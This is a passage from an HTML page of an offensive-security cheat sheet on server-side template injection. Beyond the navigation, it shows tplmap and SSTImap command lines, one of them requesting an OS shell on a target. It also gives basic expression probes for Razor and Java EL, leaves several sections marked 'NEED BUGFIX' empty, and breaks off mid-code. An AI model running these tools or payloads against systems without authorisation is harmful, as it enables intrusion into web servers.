@@ -1,0 +1,2399 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="All about server-side template injection techniques, methods, payloads, how/why/when they work.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Server-Side Template Injection" />
+<meta property="og:description" content="All about server-side template injection techniques, methods, payloads, how/why/when they work." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/server_side_template_injection/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-10-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-10-16T00:00:00+00:00" />
+<title>Server-Side Template Injection | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.afc3b3563d1884d85d5f5db04c9a930f7d7c354fdac44481534920d345015a5b.js" integrity="sha256-r8OzVj0YhNhdX12wTJqTD318NU/axESBU0kg00UBWls=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme_olympus/" class="">Olympus - TryHackMe Walkthrough</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/wordpress/" class="">Wordpress Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/office_attacks/" class="">Attacking Office</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_discovery/" class="">Network Discovery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/source_code_management/" class="">Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/java_rmi/" class="">Java RMI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oauth/" class="">OAuth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/race_conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/saml_injection/" class="">SAML Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_template_injection/" class="active">Server-Side Template Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/sql_injection/" class="">SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/type_juggling/" class="">Type Juggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xss_injection/" class="">XSS Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Server-Side Template Injection</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#server-side-template-injections">Server-Side Template Injections</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#methodology">Methodology</a></li>
+        <li><a href="#detection">Detection</a>
+          <ul>
+            <li><a href="#need-bugfix-for-this-polyglot">NEED BUGFIX FOR THIS POLYGLOT</a></li>
+          </ul>
+        </li>
+        <li><a href="#aspnet-razor">ASP.NET Razor</a>
+          <ul>
+            <li><a href="#aspnet-razor---basic-injection">ASP.NET Razor - Basic injection</a></li>
+            <li><a href="#aspnet-razor---command-execution">ASP.NET Razor - Command execution</a></li>
+          </ul>
+        </li>
+        <li><a href="#expression-language-el">Expression Language EL</a>
+          <ul>
+            <li><a href="#expression-language-el---basic-injection">Expression Language EL - Basic injection</a></li>
+            <li><a href="#expression-language-el---one-liner-injections-not-including-code-execution">Expression Language EL - One-Liner injections not including code execution</a></li>
+            <li><a href="#expression-language-el---code-execution">Expression Language EL - Code Execution</a></li>
+          </ul>
+        </li>
+        <li><a href="#freemarker">Freemarker</a>
+          <ul>
+            <li><a href="#freemarker---basic-injection">Freemarker - Basic injection</a></li>
+            <li><a href="#freemarker---read-file">Freemarker - Read File</a></li>
+            <li><a href="#freemarker---code-execution">Freemarker - Code execution</a></li>
+            <li><a href="#freemarker---sandbox-bypass">Freemarker - Sandbox bypass</a></li>
+          </ul>
+        </li>
+        <li><a href="#groovy">Groovy</a>
+          <ul>
+            <li><a href="#groovy---basic-injection">Groovy - Basic injection</a></li>
+            <li><a href="#groovy---read-and-create-file">Groovy - Read and create File</a></li>
+            <li><a href="#groovy---http-request">Groovy - HTTP request:</a></li>
+            <li><a href="#groovy---command-execution">Groovy - Command Execution</a></li>
+            <li><a href="#groovy---sandbox-bypass">Groovy - Sandbox Bypass</a></li>
+          </ul>
+        </li>
+        <li><a href="#handlebars">Handlebars</a>
+          <ul>
+            <li><a href="#need-bugfix-for-handlebars">NEED BUGFIX FOR HANDLEBARS</a></li>
+          </ul>
+        </li>
+        <li><a href="#jade--codepen">Jade / Codepen</a></li>
+        <li><a href="#java">Java</a>
+          <ul>
+            <li><a href="#java---basic-injection">Java - Basic injection</a></li>
+            <li><a href="#need-bugfix-for-some-java">NEED BUGFIX FOR SOME JAVA</a></li>
+            <li><a href="#java---retrieve-the-systems-environment-variables">Java - Retrieve the system’s environment variables</a></li>
+            <li><a href="#java---retrieve-etcpasswd">Java - Retrieve /etc/passwd</a></li>
+          </ul>
+        </li>
+        <li><a href="#django-templates">Django Templates</a>
+          <ul>
+            <li><a href="#need-bugfix-for-django">NEED BUGFIX FOR DJANGO</a></li>
+          </ul>
+        </li>
+        <li><a href="#jinja2">Jinja2</a>
+          <ul>
+            <li><a href="#need-bugfix-for-jinja2">NEED BUGFIX FOR JINJA2</a></li>
+          </ul>
+        </li>
+        <li><a href="#jinjava">Jinjava</a>
+          <ul>
+            <li><a href="#need-bugfix-for-jinjava">NEED BUGFIX FOR JINJAVA</a></li>
+          </ul>
+        </li>
+        <li><a href="#lessjs">Lessjs</a>
+          <ul>
+            <li><a href="#lessjs---ssrf--lfi">Lessjs - SSRF / LFI</a></li>
+            <li><a href="#lessjs--v3---command-execution">Lessjs &lt; v3 - Command Execution</a></li>
+            <li><a href="#plugins">Plugins</a></li>
+          </ul>
+        </li>
+        <li><a href="#mako">Mako</a>
+          <ul>
+            <li><a href="#direct-access-to-os-from-templatenamespace">Direct access to os from TemplateNamespace:</a></li>
+          </ul>
+        </li>
+        <li><a href="#pebble">Pebble</a>
+          <ul>
+            <li><a href="#need-bugfix-for-pebble">NEED BUGFIX FOR PEBBLE</a></li>
+          </ul>
+        </li>
+        <li><a href="#ruby">Ruby</a>
+          <ul>
+            <li><a href="#ruby---basic-injections">Ruby - Basic injections</a></li>
+            <li><a href="#ruby---retrieve-etcpasswd">Ruby - Retrieve /etc/passwd</a></li>
+            <li><a href="#ruby---list-files-and-directories">Ruby - List files and directories</a></li>
+            <li><a href="#ruby---code-execution">Ruby - Code execution</a></li>
+          </ul>
+        </li>
+        <li><a href="#smarty">Smarty</a></li>
+        <li><a href="#twig">Twig</a>
+          <ul>
+            <li><a href="#twig---basic-injection">Twig - Basic injection</a></li>
+            <li><a href="#need-bugfix-for-twig">NEED BUGFIX FOR TWIG</a></li>
+            <li><a href="#twig---template-format">Twig - Template format</a></li>
+          </ul>
+        </li>
+        <li><a href="#velocity">Velocity</a></li>
+        <li><a href="#pattemplate">patTemplate</a></li>
+        <li><a href="#phplib-and-html_template_phplib">PHPlib and HTML_Template_PHPLIB</a></li>
+        <li><a href="#plates">Plates</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="server-side-template-injections">
+  Server-Side Template Injections
+  <a class="anchor" href="#server-side-template-injections">#</a>
+</h1>
+<blockquote>
+<p>Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages</p>
+</blockquote>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<p>Recommended tools:</p>
+<p>
+  <a href="https://github.com/epinna/tplmap">Tplmap</a> - Server-Side Template Injection and Code Injection Detection and Exploitation Tool</p>
+<p>e.g:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python2.7 ./tplmap.py -u <span style="color:#e6db74">&#39;http://www.target.com/page?name=John*&#39;</span> --os-shell
+</span></span><span style="display:flex;"><span>python2.7 ./tplmap.py -u <span style="color:#e6db74">&#34;http://192.168.56.101:3000/ti?user=*&amp;comment=supercomment&amp;link&#34;</span>
+</span></span><span style="display:flex;"><span>python2.7 ./tplmap.py -u <span style="color:#e6db74">&#34;http://192.168.56.101:3000/ti?user=InjectHere*&amp;comment=A&amp;link&#34;</span> --level <span style="color:#ae81ff">5</span> -e jade
+</span></span></code></pre></div><p>
+  <a href="https://github.com/vladko312/SSTImap">SSTImap</a> - Automatic SSTI detection tool with interactive interface based on 
+  <a href="https://github.com/epinna/tplmap">Tplmap</a></p>
+<p>e.g:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python3 ./sstimap.py -u <span style="color:#e6db74">&#39;https://example.com/page?name=John&#39;</span> -s
+</span></span><span style="display:flex;"><span>python3 ./sstimap.py -u <span style="color:#e6db74">&#39;https://example.com/page?name=Vulnerable*&amp;message=My_message&#39;</span> -l <span style="color:#ae81ff">5</span> -e jade
+</span></span><span style="display:flex;"><span>python3 ./sstimap.py -i -A -m POST -l <span style="color:#ae81ff">5</span> -H <span style="color:#e6db74">&#39;Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk&#39;</span>
+</span></span></code></pre></div><h2 id="methodology">
+  Methodology
+  <a class="anchor" href="#methodology">#</a>
+</h2>
+<p>
+  <img src="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true" alt="SSTI cheatsheet workflow" /></p>
+<hr>
+<h2 id="detection">
+  Detection
+  <a class="anchor" href="#detection">#</a>
+</h2>
+<p>In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability :</p>
+<h3 id="need-bugfix-for-this-polyglot">
+  NEED BUGFIX FOR THIS POLYGLOT
+  <a class="anchor" href="#need-bugfix-for-this-polyglot">#</a>
+</h3>
+<h2 id="aspnet-razor">
+  ASP.NET Razor
+  <a class="anchor" href="#aspnet-razor">#</a>
+</h2>
+<p>
+  <a href="https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c">Official website</a></p>
+<blockquote>
+<p>Razor is a markup syntax that lets you embed server-based code (Visual Basic and C#) into web pages.</p>
+</blockquote>
+<h3 id="aspnet-razor---basic-injection">
+  ASP.NET Razor - Basic injection
+  <a class="anchor" href="#aspnet-razor---basic-injection">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>@(<span style="color:#ae81ff">1</span>+<span style="color:#ae81ff">2</span>)
+</span></span></code></pre></div><h3 id="aspnet-razor---command-execution">
+  ASP.NET Razor - Command execution
+  <a class="anchor" href="#aspnet-razor---command-execution">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@</span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// C# code</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="expression-language-el">
+  Expression Language EL
+  <a class="anchor" href="#expression-language-el">#</a>
+</h2>
+<p>
+  <a href="https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html">Official website</a></p>
+<blockquote>
+<p>Expression Language (EL) is mechanism that simplifies the accessibility of the data stored in Java bean component and other object like request, session and application, etc. There are many operators in JSP that are used in EL like arithmetic and logical operators to perform an expression. It was introduced in JSP 2.0</p>
+</blockquote>
+<h3 id="expression-language-el---basic-injection">
+  Expression Language EL - Basic injection
+  <a class="anchor" href="#expression-language-el---basic-injection">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#f92672">{</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="expression-language-el---one-liner-injections-not-including-code-execution">
+  Expression Language EL - One-Liner injections not including code execution
+  <a class="anchor" href="#expression-language-el---one-liner-injections-not-including-code-execution">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// DNS Lookup
